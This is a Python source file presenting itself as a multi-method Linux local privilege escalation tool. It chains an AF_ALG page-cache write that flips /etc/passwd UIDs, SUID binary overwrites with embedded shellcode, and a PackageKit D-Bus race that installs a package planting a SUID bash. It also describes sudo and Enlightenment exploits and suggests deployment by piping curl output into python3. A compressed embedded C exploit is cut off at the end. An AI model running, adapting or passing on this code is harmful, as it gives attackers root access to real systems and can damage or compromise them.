#!/usr/bin/env python3
"""
CopyFail Combo v4.0 — Multi-Method Local Privilege Escalation
CopyFail + DirtyFrag + Pack2TheRoot + Sudo Chwroot + Enlightenment

Methods (tried in order, each isolated — failure never blocks next):
  1. CopyFail /etc/passwd UID flip — AF_ALG authencesn 4-byte page cache write
  2. CopyFail binary mutation — AF_ALG, tries ALL SUID binaries until root
  3. DirtyFrag (ESP → RxRPC auto-chain) — compiled C, handles own shell
  4. Pack2TheRoot (PackageKit TOCTOU) — D-Bus race condition
  5. Sudo Chwroot (CVE-2025-32463) — sudo -R chroot NSS injection → root
  6. Enlightenment (CVE-2022-37706) — SUID enlightenment_sys path traversal → root

CopyFail (M1/M2):
  AF_ALG authencesn in-place optimization bug + splice() = controlled
  4-byte write into any file's page cache. Disk untouched.
  100% reliable, no race window to win.

DirtyFrag (M3):
  Embedded C binary with two chained variants:
  ESP: xfrm-ESP skip_cow + splice() 4-byte write via ESN seq_hi.
       Overwrites /usr/bin/su with root-shell ELF. Needs user ns. x86_64.
  RxRPC: rxkad in-place pcbc(fcrypt) decrypt + splice() 8-byte write.
         Brute-forces session key, patches /etc/passwd root entry. PAM nullok.
  Auto-chains: tries ESP first, falls back to RxRPC, spawns PTY shell.

Pack2TheRoot (M4):
  PackageKit transaction flag overwrite via repeated D-Bus InstallFiles.

Sudo Chwroot (M5):
  CVE-2025-32463 — sudo -R flag allows chroot before policy check.
  Craft fake chroot with malicious NSS module → sudo loads it as root
  → constructor fires setreuid(0,0) + execl("/bin/sh"). Needs: sudo
  with -R support (1.9.0–1.9.15p2), gcc for shared lib compilation.

Enlightenment (M6):
  CVE-2022-37706 — enlightenment_sys SUID binary path traversal.
  Mount command with /dev/../tmp/;/tmp/exploit path → shell metachar
  execution as root. Needs: enlightenment desktop with SUID binary.

Deploy: curl -sSL URL | python3
Local:  python3 copyfail_combo.py
"""

import ctypes
import ctypes.util
import os
import shutil
import struct
import subprocess
import sys
import time
import zlib

try:
    import socket
except ImportError:
    socket = None
try:
    import pwd
except ImportError:
    pwd = None

AF_ALG = 38
SOL_ALG = 279
ALG_SET_KEY = 1
ALG_SET_IV = 2
ALG_SET_OP = 3
ALG_SET_AEAD_ASSOCLEN = 4
ALG_SET_AEAD_AUTHSIZE = 5
ALG_OP_DECRYPT = 0
MSG_MORE = 0x8000

PK_SUID = "/tmp/.s"
AUTHENC_KEY = bytes.fromhex('0800010000000010') + b'\x00' * 32

PAYLOAD_X86_64 = zlib.decompress(bytes.fromhex(
    "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d"
    "209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675"
    "c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
))

SUID_ORDER = [
    "/usr/bin/newgrp", "/usr/bin/chfn", "/usr/bin/chsh",
    "/usr/bin/gpasswd", "/usr/bin/wall", "/usr/bin/expiry",
    "/usr/bin/sg", "/usr/bin/at", "/usr/bin/crontab",
    "/usr/bin/mount", "/usr/bin/umount",
    "/usr/bin/fusermount3", "/usr/bin/fusermount",
    "/usr/bin/pkexec",
    "/usr/bin/passwd", "/usr/bin/su", "/bin/su", "/usr/bin/sudo",
]

ALGOS = [
    "authencesn(hmac(sha256),cbc(aes))",
    "authencesn(hmac(sha512),cbc(aes))",
    "authencesn(hmac(sha384),cbc(aes))",
    "authencesn(hmac(sha256),ctr(aes))",
    "authencesn(hmac(sha1),cbc(aes))",
    "authencesn(hmac(sha256),cbc(camellia))",
    "authencesn(hmac(sha256),rfc3686(ctr(aes)))",
]


def log(msg, end="\n"):
    sys.stderr.write(str(msg) + end)
    sys.stderr.flush()


def qrun(cmd, **kw):
    try:
        return subprocess.run(cmd, stdout=subprocess.DEVNULL,
                              stderr=subprocess.DEVNULL, **kw)
    except Exception:
        return None


# ──────────────────────────────────────────────────
# SPLICE ABSTRACTION (Python 3.6+ via ctypes)
# ──────────────────────────────────────────────────

_splice_fn = None
_splice_native = False


def init_splice():
    global _splice_fn, _splice_native
    if hasattr(os, 'splice'):
        _splice_fn = os.splice
        _splice_native = True
        return True
    try:
        libc = ctypes.CDLL(ctypes.util.find_library('c') or "libc.so.6",
                           use_errno=True)
        libc.splice.argtypes = [
            ctypes.c_int, ctypes.POINTER(ctypes.c_int64),
            ctypes.c_int, ctypes.POINTER(ctypes.c_int64),
            ctypes.c_size_t, ctypes.c_uint,
        ]
        libc.splice.restype = ctypes.c_ssize_t

        def _splice(fd_in, fd_out, count, offset_src=None, offset_dst=None):
            oi = ctypes.byref(ctypes.c_int64(offset_src)) if offset_src is not None else None
            oo = ctypes.byref(ctypes.c_int64(offset_dst)) if offset_dst is not None else None
            r = libc.splice(fd_in, oi, fd_out, oo, count, 0)
            if r < 0:
                e = ctypes.get_errno()
                raise OSError(e, os.strerror(e))
            return r

        _splice_fn = _splice
        _splice_native = False
        return True
    except Exception:
        return False


def do_splice(fd_in, fd_out, count, offset_src=None):
    if _splice_native:
        if offset_src is not None:
            return _splice_fn(fd_in, fd_out, count, offset_src=offset_src)
        return _splice_fn(fd_in, fd_out, count)
    return _splice_fn(fd_in, fd_out, count, offset_src=offset_src)


# ──────────────────────────────────────────────────
# AF_ALG CORE
# ──────────────────────────────────────────────────

_algo = None


def find_algo():
    global _algo
    if _algo:
        return _algo

    mods = [
        "af_alg", "algif_aead", "algif_skcipher",
        "authenc", "hmac",
        "sha256", "sha256_generic",
        "aes", "aes_generic", "aes_x86_64",
        "cbc", "ctr", "camellia",
    ]
    for m in mods:
        qrun(["modprobe", m], timeout=3)

    # trigger af_alg auto-load via socket creation
    try:
        t = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
        t.close()
    except Exception:
        pass

    # trigger authenc auto-load via skcipher bind (side-loads authenc deps)
    for trigger_algo in ["cbc(aes)", "hmac(sha256)"]:
        try:
            t = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
            t.bind(("skcipher", trigger_algo))
            t.close()
        except Exception:
            pass
        try:
            t = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
            t.bind(("hash", trigger_algo))
            t.close()
        except Exception:
            pass

    for a in ALGOS:
        try:
            s = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
            s.bind(("aead", a))
            s.close()
            _algo = a
            return a
        except (OSError, PermissionError):
            continue

    # diagnostics
    af_ok = False
    try:
        s = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
        s.close()
        af_ok = True
    except Exception:
        pass

    proc_crypto = ""
    try:
        with open("/proc/crypto", "r") as f:
            proc_crypto = f.read()
    except Exception:
        pass

    if not af_ok:
        log("    [diag] AF_ALG socket failed — af_alg module not loaded/available")
        log("    [diag] container/jail or CONFIG_CRYPTO_USER_API not compiled")
    elif "authencesn" not in proc_crypto and "authenc" not in proc_crypto:
        log("    [diag] AF_ALG OK but authenc not in /proc/crypto")
        log("    [diag] module 'authenc' not loadable (missing or blacklisted)")
    elif "authencesn" in proc_crypto:
        log("    [diag] authencesn in /proc/crypto but algif_aead bind fails")
        log("    [diag] algif_aead module missing or seccomp blocking")
    else:
        log("    [diag] authenc loaded but authencesn variant not registered")

    return None


def patch_4b(file_fd, offset, data_4b):
    ctrl = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
    ctrl.bind(("aead", _algo))
    ctrl.setsockopt(SOL_ALG, ALG_SET_KEY, AUTHENC_KEY)
    ctrl.setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, None, 4)
    op, _ = ctrl.accept()

    n = offset + 4
    op.sendmsg(
        [b'AAAA' + data_4b],
        [
            (SOL_ALG, ALG_SET_OP, struct.pack('I', ALG_OP_DECRYPT)),
            (SOL_ALG, ALG_SET_IV, struct.pack('I', 16) + b'\x00' * 16),
            (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, struct.pack('I', 8)),
        ],
        MSG_MORE,
    )

    r, w = os.pipe()
    do_splice(file_fd, w, n, offset_src=0)
    do_splice(r, op.fileno(), n)

    try:
        op.recv(8 + offset)
    except Exception:
        pass

    os.close(r)
    os.close(w)
    op.close()
    ctrl.close()


# ──────────────────────────────────────────────────
# SUID DISCOVERY
# ──────────────────────────────────────────────────

def _is_suid_root_readable(path):
    try:
        if not os.path.isfile(path):
            return False
        st = os.stat(path)
        return (st.st_mode & 0o4000) and st.st_uid == 0 and os.access(path, os.R_OK)
    except (OSError, PermissionError):
        return False


def find_all_suid():
    found = set()
    ordered = []

    for p in SUID_ORDER:
        if _is_suid_root_readable(p) and p not in found:
            found.add(p)
            ordered.append(p)

    for dirs in [
        ["/usr/bin", "/bin", "/usr/sbin", "/sbin", "/usr/local/bin",
         "/usr/lib", "/usr/libexec"],
        ["/"],
    ]:
        try:
            cmd = ["find"] + dirs + ["-perm", "-4000", "-type", "f",
                   "-not", "-path", "*/proc/*", "-not", "-path", "*/sys/*"]
            r = subprocess.run(cmd, capture_output=True, text=True,
                               timeout=15 if "/" not in dirs else 30)
            for line in r.stdout.strip().split("\n"):
                p = line.strip()
                if p and p not in found and _is_suid_root_readable(p):
                    found.add(p)
                    ordered.append(p)
        except Exception:
            continue
        if ordered:
            break

    return ordered


# ──────────────────────────────────────────────────
# AUTO ROOT SHELL
# ──────────────────────────────────────────────────

def _reattach_tty():
    try:
        tty = os.open("/dev/tty", os.O_RDWR)
        os.dup2(tty, 0)
        os.dup2(tty, 1)
        os.dup2(tty, 2)
        os.close(tty)
    except OSError:
        pass


def auto_root_exec(binary):
    log("[+++] ROOT — dropping to shell")
    _reattach_tty()
    os.execl(binary, binary)


def auto_root_suid(suid_path):
    log("[+++] ROOT — dropping to shell via SUID")
    _reattach_tty()
    os.execl(suid_path, suid_path, "-p", "-c",
             "exec python3 -c 'import os;os.setuid(0);os.setgid(0);"
             "os.execl(\"/bin/bash\",\"bash\")'")


def auto_root_su(username):
    log(f"[+++] ROOT — su {username}")
    _reattach_tty()
    os.execlp("su", "su", username)


# ──────────────────────────────────────────────────
# METHOD 1: CopyFail /etc/passwd UID Flip
# ──────────────────────────────────────────────────

def try_passwd_flip():
    log("\n[=== METHOD 1: CopyFail /etc/passwd UID Flip ===]")

    if pwd is None:
        log("[-] pwd module unavailable")
        return False

    uid = os.getuid()
    if uid < 1000 or uid > 9999:
        log(f"[-] UID {uid} not 4-digit (need 1000-9999)")
        return False

    try:
        pw = pwd.getpwuid(uid)
    except KeyError:
        log(f"[-] UID {uid} not in passwd DB")
        return False

    if not os.access("/etc/passwd", os.R_OK):
        log("[-] /etc/passwd not readable")
        return False

    with open("/etc/passwd", "r") as f:
        content = f.read()

    search = f"{pw.pw_name}:"
    pos = content.find(search)
    if pos < 0:
        log(f"[-] {pw.pw_name} not found in /etc/passwd")
        return False

    after = pos + len(search)
    try:
        colon1 = content.index(":", after)
    except ValueError:
        log("[-] Malformed /etc/passwd line")
        return False
    uid_off = colon1 + 1

    expected = f"{uid:04d}"
    actual = content[uid_off:uid_off + 4]
    if actual != expected:
        log(f"[-] Sanity fail: expected '{expected}' at {uid_off}, got '{actual}'")
        return False

    log(f"[+] {pw.pw_name} uid={uid} offset={uid_off}")
    log("[*] Flipping UID → 0000 in page cache...")

    fd = os.open("/etc/passwd", os.O_RDONLY)
    try:
        patch_4b(fd, uid_off, b"0000")
    except Exception as e:
        os.close(fd)
        log(f"[-] Patch failed: {e}")
        return False
    os.close(fd)

    with open("/etc/passwd", "r") as f:
        verify = f.read()[uid_off:uid_off + 4]

    if verify == "0000":
        log("[+++] UID flip VERIFIED in page cache!")
        auto_root_su(pw.pw_name)
        return True

    log(f"[-] Verify failed: got '{verify}' (expected '0000')")
    return False


# ──────────────────────────────────────────────────
# METHOD 2: CopyFail Binary Mutation
# ──────────────────────────────────────────────────

def try_binary_mutation():
    log("\n[=== METHOD 2: CopyFail Binary Mutation ===]")

    arch = os.uname().machine
    if arch not in ("x86_64", "amd64"):
        log(f"[-] No payload for {arch} — use /etc/passwd variant")
        return False

    payload = PAYLOAD_X86_64
    log(f"[*] Payload: {len(payload)}B x86_64 ELF (setuid+execve /bin/sh)")

    suids = find_all_suid()
    if not suids:
        log("[-] No readable SUID-root binaries found")
        log("    find / -perm -4000 -type f 2>/dev/null returned nothing readable")
        return False

    log(f"[+] {len(suids)} SUID candidates: {' '.join(suids[:6])}"
        f"{'...' if len(suids) > 6 else ''}")

    verify_slice = slice(24, 32)
    expected_verify = payload[verify_slice]

    for idx, target in enumerate(suids):
        log(f"\n  [{idx+1}/{len(suids)}] {target}")

        try:
            fd = os.open(target, os.O_RDONLY)
        except (PermissionError, OSError) as e:
            log(f"    [-] open: {e}")
            continue

        ok = True
        total = len(payload)
        chunks = (total + 3) // 4

        try:
            for off in range(0, total, 4):
                chunk = payload[off:off + 4]
                if len(chunk) < 4:
                    chunk = chunk.ljust(4, b'\x00')
                patch_4b(fd, off, chunk)
            os.close(fd)
        except OSError as e:
            try:
                os.close(fd)
            except OSError:
                pass
            log(f"    [-] patch error: {e}")
            if e.errno == 22:
                log("    [-] EINVAL — seccomp/AppArmor may be blocking AF_ALG")
            continue
        except Exception as e:
            try:
                os.close(fd)
            except OSError:
                pass
            log(f"    [-] {type(e).__name__}: {e}")
            continue

        with open(target, "rb") as f:
            readback = f.read(total)

        if readback[verify_slice] == expected_verify:
            log(f"    [+++] Page cache VERIFIED — {target} is our payload now")
            auto_root_exec(target)
            return True
        else:
            log(f"    [-] Verify mismatch — corruption incomplete or reverted")
            continue

    log(f"\n[-] Exhausted all {len(suids)} SUID binaries")
    return False


# ──────────────────────────────────────────────────
# METHOD 3: Pack2TheRoot (PackageKit TOCTOU)
# ──────────────────────────────────────────────────

def try_pack2root():
    log("\n[=== METHOD 5: Pack2TheRoot (CVE-2026-41651) ===]")

    dbus_ok = any(os.path.exists(p) for p in
                  ["/var/run/dbus/system_bus_socket", "/run/dbus/system_bus_socket"])
    if not dbus_ok:
        log("[-] System D-Bus not found")
        return False

    pkg = _detect_pkg()
    if not pkg:
        log("[-] No package tools (dpkg-deb/rpmbuild/ar)")
        return False
    log(f"[+] D-Bus OK, packages: {pkg}")

    fired = False
    for name, fn in [("PyGObject", _pk_gi), ("gdbus", _pk_gdbus), ("busctl", _pk_busctl)]:
        log(f"[*] Trying {name}...")
        try:
            if fn(pkg):
                fired = True
                break
        except Exception as e:
            log(f"  [-] {name}: {e}")

    if not fired:
        log("[-] All PackageKit methods failed")
        return False

    log("[*] Waiting for SUID binary", end="")
    for i in range(240):
        if os.path.exists(PK_SUID):
            try:
                st = os.stat(PK_SUID)
                if st.st_mode & 0o4000:
                    log(f"\n[+++] SUID bash: {PK_SUID}")
                    _pk_clean()
                    auto_root_suid(PK_SUID)
                    return True
            except OSError:
                pass
        if i % 2 == 0:
            log(".", end="")
        time.sleep(0.5)

    log("\n[-] Timeout waiting for SUID binary (120s)")
    _pk_clean()
    return False


def _detect_pkg():
    if shutil.which("dpkg-deb"):
        return "deb"
    if shutil.which("rpmbuild"):
        return "rpm"
    if shutil.which("ar"):
        return "deb_ar"
    return None


def _mk_deb(path, name, payload=False):
    d = f"/tmp/.b{name}{os.getpid()}"
    dd = f"{d}/DEBIAN"
    os.makedirs(dd, exist_ok=True)
    with open(f"{dd}/control", "w") as f:
        f.write(f"Package: {name}\nVersion: 1.0\nArchitecture: all\n"
                f"Maintainer: x <x@x>\nDescription: u\n")
    if payload:
        pi = f"{dd}/postinst"
        with open(pi, "w") as f:
            f.write(f"#!/bin/sh\ninstall -m 4755 /bin/bash {PK_SUID}\n")
        os.chmod(pi, 0o755)
    r = subprocess.run(["dpkg-deb", "-b", d, path], capture_output=True)
    subprocess.run(["rm", "-rf", d])
    return r.returncode == 0


def _mk_deb_ar(path, name, payload=False):
    w = f"/tmp/.b{name}{os.getpid()}"
    os.makedirs(w, exist_ok=True)
    with open(f"{w}/debian-binary", "w") as f:
        f.write("2.0\n")
    cd = f"{w}/c"
    os.makedirs(cd, exist_ok=True)
    with open(f"{cd}/control", "w") as f:
        f.write(f"Package: {name}\nVersion: 1.0\nArchitecture: all\n"
                f"Maintainer: x <x@x>\nDescription: u\n")
    if payload:
        pi = f"{cd}/postinst"
        with open(pi, "w") as f:
            f.write(f"#!/bin/sh\ninstall -m 4755 /bin/bash {PK_SUID}\n")
        os.chmod(pi, 0o755)
    subprocess.run(["tar", "czf", f"{w}/control.tar.gz", "-C", cd, "."],
                   capture_output=True)
    subprocess.run(["tar", "czf", f"{w}/data.tar.gz", "--files-from", "/dev/null"],
                   capture_output=True)
    if os.path.exists(path):
        os.remove(path)
    r = subprocess.run(
        ["ar", "r", path, f"{w}/debian-binary",
         f"{w}/control.tar.gz", f"{w}/data.tar.gz"],
        capture_output=True, cwd=w)
    subprocess.run(["rm", "-rf", w])
    return r.returncode == 0


def _mk_rpm(path, name, payload=False):
    w = f"/tmp/.r{name}{os.getpid()}"
    for d in ["SPECS", "SOURCES", "BUILD", "RPMS", "SRPMS"]:
        os.makedirs(f"{w}/{d}", exist_ok=True)
    spec = (f"Name: {name}\nVersion: 1.0\nRelease: 1\nSummary: u\n"
            f"License: MIT\nBuildArch: noarch\n\n%description\nu\n\n")
    if payload:
        spec += f"%post\ninstall -m 4755 /bin/bash {PK_SUID}\n\n"
    spec += "%files\n"
    with open(f"{w}/SPECS/{name}.spec", "w") as f:
        f.write(spec)
    r = subprocess.run(
        ["rpmbuild", "-bb", "--define", f"_topdir {w}",
         f"{w}/SPECS/{name}.spec"], capture_output=True)
    if r.returncode == 0:
        import glob
        rpms = glob.glob(f"{w}/RPMS/**/*.rpm", recursive=True)
        if rpms:
            shutil.copy2(rpms[0], path)
            subprocess.run(["rm", "-rf", w])
            return True
    subprocess.run(["rm", "-rf", w])
    return False


def _mk_pkg(path, name, pkg, payload=False):
    if pkg == "deb":
        return _mk_deb(path, name, payload)
    elif pkg == "deb_ar":
        return _mk_deb_ar(path, name, payload)
    elif pkg == "rpm":
        return _mk_rpm(path, name, payload)
    return False


def _pk_gi(pkg):
    try:
        from gi.repository import Gio, GLib
    except ImportError:
        return False

    ext = ".deb" if pkg != "rpm" else ".rpm"
    dp = f"/tmp/.d{os.getpid()}{ext}"
    pp = f"/tmp/.p{os.getpid()}{ext}"

    if not _mk_pkg(dp, "d", pkg, False) or not _mk_pkg(pp, "p", pkg, True):
        for f in [dp, pp]:
            try:
                os.remove(f)
            except OSError:
                pass
        return False

    try:
        conn = Gio.bus_get_sync(Gio.BusType.SYSTEM, None)
        res = conn.call_sync(
            "org.freedesktop.PackageKit", "/org/freedesktop/PackageKit",
            "org.freedesktop.PackageKit", "CreateTransaction",
            None, GLib.VariantType.new("(o)"), Gio.DBusCallFlags.NONE, -1, None)
        tid = res.unpack()[0]
        log(f"  [+] Transaction: {tid}")

        conn.call("org.freedesktop.PackageKit", tid,
                  "org.freedesktop.PackageKit.Transaction", "InstallFiles",
                  GLib.Variant("(tas)", (4, [dp])),
                  None, Gio.DBusCallFlags.NONE, -1, None, None)
        conn.call("org.freedesktop.PackageKit", tid,
                  "org.freedesktop.PackageKit.Transaction", "InstallFiles",
                  GLib.Variant("(tas)", (0, [pp])),
                  None, Gio.DBusCallFlags.NONE, -1, None, None)
        conn.flush_sync(None)
    except Exception as e:
        log(f"  [-] D-Bus error: {e}")
        return False

    return True


def _pk_gdbus(pkg):
    if not shutil.which("gdbus"):
        return False

    ext = ".deb" if pkg != "rpm" else ".rpm"
    dp = f"/tmp/.d{os.getpid()}{ext}"
    pp = f"/tmp/.p{os.getpid()}{ext}"

    if not _mk_pkg(dp, "d", pkg, False) or not _mk_pkg(pp, "p", pkg, True):
        for f in [dp, pp]:
            try:
                os.remove(f)
            except OSError:
                pass
        return False

    try:
        r = subprocess.run(
            ["gdbus", "call", "--system", "--dest", "org.freedesktop.PackageKit",
             "--object-path", "/org/freedesktop/PackageKit",
             "--method", "org.freedesktop.PackageKit.CreateTransaction"],
            capture_output=True, text=True, timeout=10)
        if r.returncode != 0:
            return False
        tid = r.stdout.strip().strip("()'\" ,")
        if "/" not in tid:
            return False
        log(f"  [+] Transaction: {tid}")

        p1 = subprocess.Popen(
            ["gdbus", "call", "--system", "--dest", "org.freedesktop.PackageKit",
             "--object-path", tid, "--method",
             "org.freedesktop.PackageKit.Transaction.InstallFiles",
             "uint64 4", f"['{dp}']"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        p2 = subprocess.Popen(
            ["gdbus", "call", "--system", "--dest", "org.freedesktop.PackageKit",
             "--object-path", tid, "--method",
             "org.freedesktop.PackageKit.Transaction.InstallFiles",
             "uint64 0", f"['{pp}']"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        p1.wait(timeout=15)
        p2.wait(timeout=15)
    except Exception as e:
        log(f"  [-] gdbus error: {e}")
        return False
    return True


def _pk_busctl(pkg):
    if not shutil.which("busctl"):
        return False

    ext = ".deb" if pkg != "rpm" else ".rpm"
    dp = f"/tmp/.d{os.getpid()}{ext}"
    pp = f"/tmp/.p{os.getpid()}{ext}"

    if not _mk_pkg(dp, "d", pkg, False) or not _mk_pkg(pp, "p", pkg, True):
        for f in [dp, pp]:
            try:
                os.remove(f)
            except OSError:
                pass
        return False

    try:
        r = subprocess.run(
            ["busctl", "call", "org.freedesktop.PackageKit",
             "/org/freedesktop/PackageKit",
             "org.freedesktop.PackageKit", "CreateTransaction"],
            capture_output=True, text=True, timeout=10)
        if r.returncode != 0:
            return False
        tid = r.stdout.strip().split('"')[1] if '"' in r.stdout else None
        if not tid:
            return False
        log(f"  [+] Transaction: {tid}")

        p1 = subprocess.Popen(
            ["busctl", "call", "org.freedesktop.PackageKit", tid,
             "org.freedesktop.PackageKit.Transaction", "InstallFiles",
             "tas", "4", "1", dp],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        p2 = subprocess.Popen(
            ["busctl", "call", "org.freedesktop.PackageKit", tid,
             "org.freedesktop.PackageKit.Transaction", "InstallFiles",
             "tas", "0", "1", pp],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        p1.wait(timeout=15)
        p2.wait(timeout=15)
    except Exception as e:
        log(f"  [-] busctl error: {e}")
        return False
    return True


def _pk_clean():
    for ext in [".deb", ".rpm"]:
        for prefix in [".d", ".p"]:
            try:
                p = f"/tmp/{prefix}{os.getpid()}{ext}"
                if os.path.exists(p):
                    os.remove(p)
            except OSError:
                pass



# ──────────────────────────────────────────────────
# DIRTYFRAG EMBEDDED C SOURCE (compressed)
# ──────────────────────────────────────────────────

_DIRTYFRAG_HEX = (
    "78dad5bd6b5b1b49b220fc197e455ab3b6252c84ee12d0780e60e1e6310d1cc0ddd3ebe65497aa4a506ba94a532571e969efb39fde1ff03efb0bf7976c5cf256a512c8ed9e397b986959ca4be425222322232323ffe207a3300a84f3fef4a37379f6f1e270b0fe9730f2c6733f10dfa5333f8c6bb76fb349e370984f4bc2e866a15c18cdb269f32884e46cdac88b66e36c52902451be55ef36c8554c1fd32df8cf73c7e3c58cd9e334480bcac7dee760b6983e5f18252486b1372b007def863908513083299c6d855136dd4da6ee16e62c14df0a47d9b47118cd1f96a44279f8f2b9282b993d91f9304a26980e19a308d02c3ebe3b7706a787fbe7eb7f9158d729a251afafff2588fc70b458dc195c9e1f9fc2cfc57a3a4b34f3d52fcf4e1cbb8efc2d1a3d5552670128e7fcece24aa8bf7607bba32a0efeddf971ff44678aa6957931383fd9ffd9813232b361655eed5fbc1f5c39e7fb57df7366696b9e265bc330da4ae7255d0cf20fbf77ce8e8e2e07dc85bac8fc6d6d88f82e48ee93701688fbdb780c3d3e3912e9cc4d00f137c29d8951380e3ed5afc5c69605f5e793b3fd77cec9e054f66cbb99833a7c9c05a9884722bd0dc66327188fc42c16dc4eb9dd17b0ac6e6e8224add87007a757173f677afbd0eb67e112382f065208a259f228c2280de1c7ec361051704f9d0780eb5b1beb6203bbb5891d1193300a27ee583cf4bb4eb72d92389e6d1224ac50c3a2423834681c71fda15dafd77bfd1dce10220d6637a15fae5776f1ebdc7cbd49e2f9342dd7abe2f4e3c949655755081e02ef2e2897181fb725ceaf8a4fa5abc1c50f7b0fb32099c8c46b55ebfccac149151e2224854e0cfb7216cb383ad79bcd61045e1ccd60e415ece79debfb89ec6dbd2e2edefc0d87c2d02e83192110db8349d21344a37e9dc2ecdd8914301b79d0006472add26c3a9fed88d318608fe78118c589f86f08a224b6203348217307c0cd02c01d8c721a78b3c02f89280e5309622b98795b4337bdade147e20937f2c52809615d40ab937006641644b25fa99847308daadb8788d7f2288927403923c82002a8483cb41a6234ca92af78800e067e58c50f53aa5b542ac552a929e5d58b4ab90f55fce052c3bae8bab95293f84eb8e32af42c9fb52be984ebd647a2dec9d5953cdd00df5e0e7cbb00f8fc6b80f7da4b81e7b32c5a5e113e8cbd9e9fbfe93cbdcdf317051fc86dfaa9712df688e619067081be8fed349a088cff3f0e5c9120123e25e1f44dfda1d1bc56302019eadb2b88e1740adaa4be6085657da95f9b4e6c8ba0999fa8c4873e24e9345f19d2a11308c21e44cb5f1c045265c120fc1007a118c36a34bbd08934943329ca6e727357d148690d45a7bf88940748df15d3786acd899ad0ceb62833bfaa3c8bfc62dce6991df13a9c2209d042d92ff512572beb05ee766a35f81ca9c2128c2e99293cac63e1610f0b6fad03c79e851ef2c47426e6c096facecc089c4f969842cafbc7fa1a90fea80a0cb3831f1e7e74e1a3dec48f86fea8affc8110b93626b4029d5500a7d757dfdacf406cd7bfae172bf4b120cbb4d2ea3fd5ef25108b4a76fe9c3eae3afee7e671d85f0dce6ae5741f1bcf436ce1ec8c46fa5b577df3a83dfce8ba0c71a4268e53b7ab0b69bd76260d2aaaf163bffbbeca68348b70dd31251176d0cc546cf95c71c908ba04915a6c0d11583fd3954e5b2da60e81d51089d6a9df5dcced616ed737f3d84410dda61a7017170ea5f55af8b3ff95d4f365777d3d40fe12a16e226e9c74ee8012358cd360773d9f029ca0be6b34f093b3f7e5d1645615b55aad22fc58fc43842351b66b54c4680abbc0d9a80c5b3cd8c15545e9533abf1625011545e9970854b9bffcc5014dde01adfcd2714039fc026a0ea8570234c575c5a7b027a4013bd324f6caccb6bc5b37111b5377765b1576ca700e1c115816561af9d0e9781a44652e77e6fc7471767af233a88e6bd859c8ff4ed42b22011501e660b3b1cbf522a8460d4289aa008855d0ec1350faca081d6b7b63181fe4e277593bda5dffa2bb7c17873e691e53679ec2fca60eeccaa2b48ce9d43d504980e726813b76e02bb477c30a3202bc3179372aef46e661b741f783a106e5c393b3d381733af8e9e3e5e042fc2ef4efd3c1558547062dad11aa4ab2d28e789996683880903829d3c69a86b4163c84b37203bf7e595fb3e6bbb485ff6ca5201ab6b4be03304a7e103d96683670e627eef453b77d0d3fd348a21d92a0a9f0b720a6ef15a853172fe7a201b5d5d0d5a0963488f30455a10202581814e72e1b94c80c69f56edd3cdbad9b27bb75f335dd42824b01c96c8828ef1f39c780bf2a6c8e0f3f38efde5fecff00aaa7ea4e2a9be2f557e23acfb62370f4b364eecd608d26c1dff173574c8209a0b3fc0a7e400b7a46e027d1035488bce923feaec17f4ee44e0298a9710c4d1d1f9deeff7079fcdf55b7c82e524ea1d3c76787ef8f8f8e4ef6df5f560582ae647b6c1758a9dfaaf9d1d8bd49c5ef7bd0f691f3f11cc81dbf5c7c3c3d3d3e7d5fd48dcbe7ba71f935dde0059f561616396cfc1c77364bca7282a3f124bdb985fde54634069683d845cb9362525467c377672e4f382c74e02bc41224806486e0c406fc0b5451cea556ca65e67315002fde88d3931f2edf3bfb27c7ef4fcb90b2f996da771026f1a699bbf9163e1cec0380c37fec64282720f9e26a1fb5bdf757df97b1269400e240e463c6bbfdabfd32148675c2fd9645b2cda162bdbc2fd05304c57976eb9909c5c982bdb983662a2775cba89ab69aa89b4e41a1d7bf80997bb74e1afcfd36d4ac3efd9c5942b0824e8e4f3fc85574b1ff5355c824e76f47173fe8e5f4795100c8094758682770a231e014d560518bc6cec89d84e347f8691a115f243450c07d0059d5485330362aafa2b15e60d1b8a2a95192d5672032d307a037c95341dc7c6ad7b7bba486d7bf98de65a8cc2213935e81ba5924110940599c0007310592e2723f5b865719a1d281d535f8f78f83cb2b586bfc7bfff043b6f8148859b0809a4a0165e5028628b7b1482c42938b243b393772184400283853d709a31109283df67ca6d87848ad2958ccae704b44c7d00fece543baf936f46b3e62a7e6b6a13a1a651dfc592e359abd5a1dfed728594581047953b5276e6771046c661a5ad9201a6631671f9f9f5f9c5d9da11d54e6a7aa19ca7fb225495fb225290c64de04cd3c42e5311acfde0d9cab8bfdd34b3496ca7249301dbb8fce3d90637ccf6a9b4cff3be18beba3feda6aab6609ef19d09757fb570318c4a92c321ecd6a693c9a39685c73c6219aa4b030add26edb995568f9a8a240befe8a4509ead4c5b52b0b3f0df5f9a220a36b6a26f3b38879d304b4d807204407d5ab56b3302bcd67ad4a2d58367dbeecfa1a6a0cb4ceddf18d836bbd60154056ecb8f3d92df2d05613f5ab3529b9652d5b78cb2456e80ac1880dd7cdaf162bb32221c8faa401b8c0ae31596a00b713d72b8332d9ec742b25d3b2550810411d50699f8347bdea5b4db121fa762e7424f2a4086934fbf6004d7d34bfedef57a13a41d65297842cd22b0a17103e1fafbe87f5f0f1f4b02af4f414cccd97d5271fe7bdd1fd9679171b41e19417cf76909d6d6fe895dd20b5663a2898e92037d330935d35cfb2d74176320f0eaa50e6c9c93cbcf8f9fc6aa579b44716449e3b756693e958c057ab03afe0a73d67f0536e3c22af266b4911b57898942d974ee3642639715a5667453960fe2a85629717697dd94450374087a4cee77a6e53519046cba848f26354720207ca2145b56d8292753393c3498b04950706c4954679ea5a2c54910069f469b4f9763899ca3529b490e69c98e5b611143a2793816aa33e69cb54766ec3e2ca2603722c2d4e97c94b2e62bf8568914d83